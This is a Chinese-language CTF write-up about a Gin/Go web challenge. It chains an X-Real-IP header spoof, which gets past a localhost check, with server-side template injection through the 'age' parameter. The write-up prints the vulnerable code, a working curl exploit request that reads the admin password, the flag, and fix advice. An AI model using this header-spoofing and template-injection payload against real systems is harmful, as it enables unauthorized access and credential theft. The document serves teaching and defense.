# loginme

## 题目简述

题目是一个使用 Gin 和 Go `html/template` 实现的 Web 服务。`/admin/index` 先经过本地地址中间件，再根据 `id` 选择用户；管理员的 `Age` 为空，因此可以由查询参数 `age` 补入。程序把这个值先拼进模板源码，再用管理员对象执行模板，形成服务端模板注入。

利用需要连续完成两步：用 `X-Real-IP` 让 Gin 的 `ClientIP()` 返回 `127.0.0.1`，绕过只显式拦截 `X-Forwarded-For` 和 `X-Client-IP` 的中间件；再把 `{{.Password}}` 注入管理员页面的模板源码，读取管理员对象中的密码字段。

## 解题过程

本地地址检查的核心代码如下：

```go
if c.GetHeader("x-forwarded-for") != "" ||
   c.GetHeader("x-client-ip") != "" {
    c.AbortWithStatus(403)
    return
}

if c.ClientIP() != "127.0.0.1" {
    c.AbortWithStatus(401)
    return
}
```

过滤器只排除了两个请求头，却没有排除 Gin 也会识别的 `X-Real-IP`。因此请求中加入：

```http
X-Real-IP: 127.0.0.1
```

即可通过中间件。接着分析用户选择逻辑：`TargetUser` 初始值就是 `structs.Admin`，仅当 `id` 命中普通用户列表时才会替换。使用不存在的整数，例如 `-11`，便会保留管理员对象。管理员 `Age` 是空字符串，程序随后接受查询参数 `age`：

```go
TargetUser := structs.Admin
for _, user := range structs.Users {
    if user.Id == id {
        TargetUser = user
    }
}

age := TargetUser.Age
if age == "" {
    age, _ = c.GetQuery("age")
}

html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)
tmpl, _ := template.New("admin_index").Parse(html)
tmpl.Execute(c.Writer, TargetUser)
```

这里不是把 `age` 当普通模板数据输出，而是通过 `fmt.Sprintf` 把它写进待解析的模板文本。令 `age={{.Password}}`，模板执行时的上下文又恰好是管理员对象，于是会渲染其导出字段 `Password`。

完整请求为：

```bash
curl -g 'http://target/admin/index?id=-11&age={{.Password}}' \
  -H 'X-Real-IP: 127.0.0.1'
```

响应页面显示管理员密码，也就是：

```text
SCTF{E@zy_SIGn_Ch3eR!}
```

## 方法总结

本题把两个看似独立的问题串成了一条利用链。第一个问题是代理地址信任边界不一致：过滤器检查的请求头集合与框架实际采用的客户端 IP 来源不一致。第二个问题是模板与数据边界混淆：用户输入参与构造模板源码，随后才被解析。

修复时应显式配置可信代理，并从服务端连接信息获得来源地址；模板应在启动时固定解析，把年龄作为数据字段传入，不能用 `fmt.Sprintf` 拼接模板语法。
